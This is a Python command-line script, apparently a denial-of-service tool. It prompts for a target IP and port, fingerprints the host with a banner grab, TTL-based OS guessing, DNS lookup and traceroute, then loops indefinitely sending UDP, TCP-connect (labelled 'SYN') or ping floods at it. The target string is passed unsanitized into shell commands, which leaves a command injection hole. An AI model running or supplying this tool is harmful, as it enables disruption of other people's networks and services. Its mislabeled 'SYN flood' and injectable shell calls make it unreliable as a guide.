import socket
import time
import os
import platform
import subprocess

def detect_platform(target_ip, target_port):
    platform_info = {
        "OS": "Unknown",
        "System Info": "Unknown",
        "Hostname": "Unknown",
        "DNS Info": "Unknown",
        "Traceroute": "Unknown"
    }

    # Attempt to grab banner via TCP connection
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(3)
            sock.connect((target_ip, target_port))
            sock.sendall(b"GET / HTTP/1.1\r\nHost: " + target_ip.encode() + b"\r\n\r\n")
            banner = sock.recv(1024).decode('utf-8', errors='ignore')
            if banner:
                platform_info["System Info"] = banner.splitlines()[0]
                print(f"[+] Detected banner: {banner.splitlines()[0]}")
    except socket.error as e:
        print(f"[-] Unable to retrieve banner via TCP: {e}")

    # Perform OS detection using ping
    try:
        if platform.system() == "Windows":
            response = os.popen(f"ping {target_ip} -n 1").read()
        else:
            response = os.popen(f"ping {target_ip} -c 1").read()

        if "TTL" in response:
            if "64" in response:
                platform_info["OS"] = "Linux"
            elif "128" in response:
                platform_info["OS"] = "Windows"
            elif "255" in response:
                platform_info["OS"] = "Cisco/Router"
    except Exception as e:
        print(f"[-] Unable to detect OS via ping: {e}")

    # Retrieve Hostname
    try:
        hostname = socket.gethostbyaddr(target_ip)[0]
        platform_info["Hostname"] = hostname
    except socket.herror:
        print("[-] Hostname resolution failed.")

    # Perform DNS Lookup
    try:
        dns_info = subprocess.check_output(["nslookup", target_ip], universal_newlines=True)
        platform_info["DNS Info"] = dns_info.strip()
    except Exception as e:
        print(f"[-] DNS lookup failed: {e}")

    # Perform Traceroute
    try:
        if platform.system() == "Windows":
            traceroute = subprocess.check_output(f"tracert -d {target_ip}", shell=True, universal_newlines=True)
        else:
            traceroute = subprocess.check_output(f"traceroute -n {target_ip}", shell=True, universal_newlines=True)
        platform_info["Traceroute"] = traceroute.strip()
    except Exception as e:
        print(f"[-] Traceroute failed: {e}")

    # Print all detected details
    print(f"[+] Detected Platform Information:")
    for key, value in platform_info.items():
        print(f"    {key}: {value}")

    return platform_info

def udp_flood(target_ip, target_port, message, delay):
    print(f"[*] Starting UDP flood attack on {target_ip}:{target_port}...")
    try:
        while True:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
                sock.sendto(message.encode('utf-8'), (target_ip, target_port))
                print(f"[+] UDP Packet sent: {message}")
                time.sleep(delay)
    except KeyboardInterrupt:
        print("\n[!] Stopping UDP flood attack.")
    except Exception as e:
        print(f"[-] Error during UDP flood attack: {e}")

def syn_flood(target_ip, target_port, delay):
    print(f"[*] Starting SYN flood attack on {target_ip}:{target_port}...")
    try:
        while True:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
                sock.settimeout(1)
                try:
                    sock.connect((target_ip, target_port))
                    print(f"[+] SYN Packet sent to {target_ip}:{target_port}")
                except Exception:
                    pass
                time.sleep(delay)
    except KeyboardInterrupt:
        print("\n[!] Stopping SYN flood attack.")
    except Exception as e:
        print(f"[-] Error during SYN flood attack: {e}")

def icmp_flood(target_ip, delay):
    print(f"[*] Starting ICMP (ping) flood attack on {target_ip}...")
    try:
        while True:
            response = os.system(f"ping -c 1 {target_ip} > /dev/null 2>&1")
            if response == 0:
                print(f"[+] ICMP Echo Request sent to {target_ip}")
            else:
                print(f"[-] ICMP Echo Request failed for {target_ip}")
            time.sleep(delay)
    except KeyboardInterrupt:
        print("\n[!] Stopping ICMP flood attack.")
    except Exception as e:
        print(f"[-] Error during ICMP flood attack: {e}")

def main():
    # User input
    target_ip = input("Enter the target IP address: ").strip()
    try:
        target_port = int(input("Enter the target port (1-65535): ").strip())
        if not (1 <= target_port <= 65535):
            raise ValueError("Invalid port number.")
    except ValueError as e:
        print(f"[-] {e}")
        return

    attack_type = input("Choose attack type (1: UDP flood, 2: SYN flood, 3: ICMP flood): ").strip()
    custom_message = input("Enter the message to send (default: 'TEST_PACKET'): ").strip() or "TEST_PACKET"
    try:
        packet_delay = float(input("Enter delay between packets in seconds (default: 0.1): ").strip() or 0.1)
    except ValueError:
        print("[-] Invalid delay value. Please enter a valid number.")
        return

    # Detect platform
    platform_info = detect_platform(target_ip, target_port)

    # Display detected information
    print("\n[+] Platform Information:")
    print(f"    Operating System: {platform_info['OS']}")
    print(f"    System Info: {platform_info['System Info']}\n")

    # Select attack type
    if attack_type == "1":
        udp_flood(target_ip, target_port, custom_message, packet_delay)
    elif attack_type == "2":
        syn_flood(target_ip, target_port, packet_delay)
    elif attack_type == "3":
        icmp_flood(target_ip, packet_delay)
    else:
        print("[-] Invalid attack type selected.")

if __name__ == "__main__":
    main()